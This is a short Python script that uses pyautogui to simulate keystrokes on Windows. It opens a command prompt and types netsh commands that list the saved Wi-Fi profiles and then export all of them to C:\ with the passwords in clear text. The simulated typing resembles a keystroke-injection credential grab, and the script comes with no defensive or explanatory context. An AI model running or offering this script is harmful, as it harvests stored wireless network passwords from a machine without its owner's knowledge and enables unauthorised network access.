
from pyautogui import hotkey
import time 

hotkey('win')
hotkey('c','m','d') 
time.sleep(0.5)  

# hotkey('numlock')  
# time.sleep(0.23) 
# hotkey('right') 
# hotkey('down') 
# hotkey('enter') 
# time.sleep(2) 
# hotkey('left') 
# hotkey('enter') 
# time.sleep(1) 

hotkey('enter') 
time.sleep(0.5) 
q1='netsh wlan show profile'
for q in q1:
    hotkey(q) 
time.sleep(0.5) 
hotkey('enter') 
time.sleep(2.3) 
q2='netsh wlan export profile folder=C:\ key=clear'
for q in q2:
    hotkey(q) 
time.sleep(0.5) 
hotkey('enter') 
